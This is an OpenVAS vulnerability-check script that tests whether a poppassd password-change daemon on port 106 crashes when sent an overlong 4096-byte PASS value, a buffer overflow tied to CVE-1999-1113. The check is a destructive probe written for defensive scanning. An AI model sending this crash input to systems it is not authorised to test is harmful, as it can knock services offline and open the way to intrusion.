# OpenVAS Vulnerability Test
# $Id: poppassd_too_long_user.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: poppassd USER overflow
#
# Authors:
# Michel Arboi
#
# Copyright:
# Copyright (C) 2005 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.17295");
  script_version("2019-04-10T13:42:28+0000");
  script_tag(name:"last_modification", value:"2019-04-10 13:42:28 +0000 (Wed, 10 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-1999-1113");
  script_bugtraq_id(75);
  script_name("poppassd USER overflow");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("This script is Copyright (C) 2005 Michel Arboi");
  script_family("Gain a shell remotely");
  script_dependencies("find_service1.nasl", "find_service_3digits.nasl");
  script_require_ports("Services/pop3pw", 106);

  script_tag(name:"solution", value:"Upgrade your software or use another one.");

  script_tag(name:"summary", value:"The remote poppassd daemon crashes when a too
  long name is sent after the USER command.");

  script_tag(name:"impact", value:"It might be possible for a remote attacker to run
  arbitrary code on this machine.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_banner_unreliable");

  exit(0);
}

include("misc_func.inc");

port = get_port_for_service(default:106, proto:"pop3pw");

soc = open_sock_tcp(port);
if(! soc)
  exit(0);

r = recv_line(socket:soc, length:4096);
if(r !~ '^200 ') {
  close(soc);
  exit(0);
}

vt_strings = get_vt_strings();

send(socket:soc, data:'USER ' + vt_strings["lowercase"] + '\r\n');
r = recv_line(socket:soc, length:4096);
if(r !~ '^200 ') {
  close(soc);
  exit(0);
}

send(socket:soc, data:'PASS '+crap(4096)+'\r\n');
line = recv_line(socket:soc, length:4096);
close(soc);

sleep(1);

soc = open_sock_tcp(port);
if (! soc) {
  security_message(port);
  exit(0);
}

if(! line) {
  security_message(port:port, data:"Note that the scanner did not crash the service, so this might be a false positive. However, if the poppassd service is run through inetd it is impossible to reliably test this kind of flaw.");
  exit(0);
}

exit(99);